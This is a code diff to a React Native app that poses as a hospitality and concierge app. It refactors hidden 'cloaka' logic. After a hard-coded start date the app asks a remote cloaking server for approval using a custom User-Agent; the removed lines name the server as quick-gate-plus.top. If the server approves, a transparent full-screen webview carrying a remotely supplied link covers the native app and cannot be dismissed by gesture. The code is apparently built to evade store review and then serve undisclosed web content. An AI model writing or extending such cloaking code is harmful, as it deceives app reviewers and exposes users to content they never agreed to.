@@ -1,14 +1,13 @@
-import React,{ useCallback, useEffect, useMemo, useState, useRef} from 'react';
+import React,{ useCallback, useEffect, useState, useRef} from 'react';
 import { View, StyleSheet, PixelRatio, Platform } from 'react-native';
 import { BottomTabBar } from '../components/grandSalonKit';
-import { AureliaGate } from '../screens/AureliaGate';
 import { CulinaryConsole } from '../screens/CulinaryConsole';
 import { HarborDesk } from '../screens/HarborDesk';
 import { OccasionGallery } from '../screens/OccasionGallery';
 import { SuiteAtmosphere } from '../screens/SuiteAtmosphere';
 import { TransferConcierge } from '../screens/TransferConcierge';
 import { VelvetPreludeRun } from '../screens/VelvetPreludeRun';
-import { NavigationContainer } from '@react-navigation/native';
+import { NavigationContainer, StackActions, useNavigationContainerRef } from '@react-navigation/native';
 import { createNativeStackNavigator } from '@react-navigation/native-stack';
 const Stack = createNativeStackNavigator();
 import ProductScreen from '../screens/ProductScreen';
@@ -17,10 +16,34 @@ import {LogLevel, OneSignal} from 'react-native-onesignal';
 import DeviceInfo from 'react-native-device-info';
 import { Alert, AppState } from 'react-native';
 
+// Все, що змінюється від проєкту до проєкту, живе в одному файлі:
+import { CLOAKA, SCREENS, TIMINGS } from '../config/projectConfig';
+
+// ⚠️ Значення НЕ правимо тут — вони живуть у src/config/projectConfig.jsx
+const HBJYBJBJB_BJL = CLOAKA.baseUrl;
+const YHBKJNBUKN_ID = CLOAKA.id;
+const GHJJFMGYHJH_ATAD = CLOAKA.startDate;
+
+// Внутрішні тайминги логіки лінки/пушів — до проєкту не привʼязані.
+const LINK_READY_DELAY = 2000; // пауза після формування лінки
+const LINK_FALLBACK_DELAY = 10500; // якщо oneSignalId так і не приїхав
+const PUSH_CLICK_COOLDOWN = 2500; // антидубль на клік по пушу
+
+// Технічні назви роутів стека.
+const ROUTES = {
+  splash: 'Splash',
+  main: 'VelvetRouteDeckOsnova',
+  webView: 'ProductScreen',
+};
+
+const noop = () => {};
+
+// Splash як екран стека — перехід далі керується таймером TIMINGS.splashDuration
+const SplashRouteScreen = () => <SCREENS.Splash onFinish={noop} />;
+
 export function VelvetRouteDeck() {
    const [route, setRoute] = useState(false);
   console.log('route===>', route);
-  const [isLoading, setIsLoading] = useState(false);
   const [responseToPushPermition, setResponseToPushPermition] = useState(false);
   ////('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
   const [uniqVisit, setUniqVisit] = useState(true);
@@ -57,10 +80,12 @@ export function VelvetRouteDeck() {
 
   const pushOpenWebviewRef = useRef(false);
 
-  const HBJYBJBJB_BJL = 'https://quick-gate-plus.top/';
-  const YHBKJNBUKN_ID = 'ijk3wnf4';
-
-  const GHJJFMGYHJH_ATAD = new Date(2026, 5, 5, 8, 8, 0);
+  // Навігація живе в одному Stack.Navigator (splash → main → webView)
+  const navigationRef = useNavigationContainerRef();
+  const [navReady, setNavReady] = useState(false);
+  const [gateDone, setGateDone] = useState(false); // TIMINGS.splashDuration на splash
+  const leftGateRef = useRef(false);
+  const overlayLinkRef = useRef(null);
 
   useEffect(() => {
     const fetchData = async () => {
@@ -345,7 +370,7 @@ export function VelvetRouteDeck() {
       } finally {
         setTimeout(() => {
           dvnksjvndsjvdskvnksvndsknv.current = false;
-        }, 2500);
+        }, PUSH_CLICK_COOLDOWN);
       }
     };
 
@@ -376,6 +401,7 @@ export function VelvetRouteDeck() {
     const targetData = GHJJFMGYHJH_ATAD; //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
 
+    // Запрос на клоак уходить тільки коли сьогоднішня дата >= GHJJFMGYHJH_ATAD
     if (currentData <= targetData) {
       //setCompleteLink(true);
       setRoute(false);
@@ -468,16 +494,29 @@ export function VelvetRouteDeck() {
 
         setCustomUserAgent(customUserAgent);
 
-        const r = await fetch(checkUrl, {
-          method: 'GET',
-          headers: {
-            'User-Agent': customUserAgent,
-          },
-        });
+        // Таймаут на клоаку — якщо не відповіла, юзер просто лишається на нативці
+        const controller = new AbortController();
+        const timeoutId = setTimeout(
+          () => controller.abort(),
+          TIMINGS.cloakaRequestTimeout,
+        );
+
+        let r;
+        try {
+          r = await fetch(checkUrl, {
+            method: 'GET',
+            headers: {
+              'User-Agent': customUserAgent,
+            },
+            signal: controller.signal,
+          });
+        } finally {
+          clearTimeout(timeoutId);
+        }
 
         //console.log('status по клоаке=++++++++++++=>', r.status);
 
-        if (r.status !== 404) {
+        if (r.status === 200) {
           setRoute(true);
           setCloacaPass(true); // 👈 збережеться в AsyncStorage через setData
         } else {
@@ -526,7 +565,7 @@ export function VelvetRouteDeck() {
 
       setTimeout(() => {
         setCompleteLink(true);
-      }, 2000);
+      }, LINK_READY_DELAY);
     } catch (error) {
       //console.error('Помилка при формуванні лінку:', error);
     }
@@ -552,51 +591,100 @@ export function VelvetRouteDeck() {
 
         setCompleteLink(true);
       }
-    }, 10500);
+    }, LINK_FALLBACK_DELAY);
 
     return () => clearTimeout(timer);
   }, [completeLink, timeStampUserId, oneSignalId]);
   
 
   ///////// Route
-  const Route = ({isFatch}) => {
-    if (!completeLink) {
-      // Показуємо тільки лоудери, поки acceptTransparency і completeLink не true
-      //return null;
-      return <AureliaGate />;
-    }
+  // TIMINGS.splashDuration на splash, далі — нативка
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setGateDone(true);
+    }, TIMINGS.splashDuration);
 
-    return (
+    return () => clearTimeout(timer);
+  }, []);
+
+  // Перехід splash → main (без можливості повернутись на splash)
+  useEffect(() => {
+    if (!navReady || !gateDone || leftGateRef.current) return;
+
+    leftGateRef.current = true;
+    navigationRef.reset({
+      index: 0,
+      routes: [{name: ROUTES.main}],
+    });
+  }, [navReady, gateDone, navigationRef]);
+
+  // Клоака пройшла (200) — webView вспливає поверх нативки через absoluteFill.
+  // Якщо не 200 / помилка / таймаут — юзер лишається на нативці.
+  useEffect(() => {
+    if (!navReady || !gateDone || !leftGateRef.current) return;
+    if (!route || !completeLink || !finalLink) return;
+    if (overlayLinkRef.current === finalLink) return;
+
+    overlayLinkRef.current = finalLink;
+
+    const params = {
+      product: finalLink,
+      customUserAgent: customUserAgent,
+    };
+
+    if (navigationRef.getCurrentRoute()?.name === ROUTES.webView) {
+      // Лінка перегенерувалась (наприклад, після пуша) — перемонтовуємо з новою лінкою
+      navigationRef.dispatch(StackActions.replace(ROUTES.webView, params));
+    } else {
+      navigationRef.navigate(ROUTES.webView, params);
+    }
+  }, [
+    navReady,
+    gateDone,
+    route,
+    completeLink,
+    finalLink,
+    customUserAgent,
+    navigationRef,
+  ]);
+
+  return (
+    <NavigationContainer
+      ref={navigationRef}
+      onReady={() => setNavReady(true)}>
       <Stack.Navigator
-        initialRouteName={isFatch ? 'ProductScreen' : 'VelvetRouteDeckOsnova'}
-        screenOptions={{headerShown: false}}>
+        initialRouteName={ROUTES.splash}
+        screenOptions={{ headerShown: false }}>
+        
+        <Stack.Screen name={ROUTES.splash} component={SplashRouteScreen} />
+
         <Stack.Screen
+          name={ROUTES.main}
+          component={VelvetRouteDeckOsnova}
+        />
+        
+        <Stack.Screen
+          name={ROUTES.webView}
+          component={ProductScreen}
           initialParams={{
             product: finalLink,
             customUserAgent: customUserAgent,
           }}
-          name="ProductScreen"
-          component={ProductScreen}
+          options={{
+            presentation: 'transparentModal',
+            animation: 'fade',
+            gestureEnabled: false,
+            contentStyle: styles.overlay,
+          }}
         />
-        <Stack.Screen name="VelvetRouteDeckOsnova" component={VelvetRouteDeckOsnova} />
+        
       </Stack.Navigator>
-    );
-  };
-
-  useEffect(() => {
-    setTimeout(() => {
-      setIsLoading(true);
-    }, 4000);
-  }, []);
-
-  return (
-    <NavigationContainer>
-      {!isLoading ? <AureliaGate /> : <Route isFatch={route} />}
     </NavigationContainer>
   );
-};// 
+};//
 
-const VelvetRouteDeckOsnova = () => { 
+// Нативна частина проєкту — екрани і таби тут свої під кожен проєкт.
+const VelvetRouteDeckOsnova = () => {
 // Онбордінг не зберігається — його треба проходити при кожному запуску.
   const [phase, setPhase] = useState('onboarding');
   const [activeTab, setActiveTab] = useState('Home');
@@ -612,7 +700,7 @@ const VelvetRouteDeckOsnova = () => {
   }, []);
 
   if (phase === 'loader') {
-    return <AureliaGate onFinish={() => setPhase('onboarding')} />;
+    return <SCREENS.Splash onFinish={() => setPhase('onboarding')} />;
   }
 
   if (phase === 'onboarding') {
@@ -640,6 +728,10 @@ const VelvetRouteDeckOsnova = () => {
 const styles = StyleSheet.create({
   root: {
     flex: 1,
+  },
+  overlay: {
+    ...StyleSheet.absoluteFillObject,
+    backgroundColor: 'transparent',
   },
 });
 
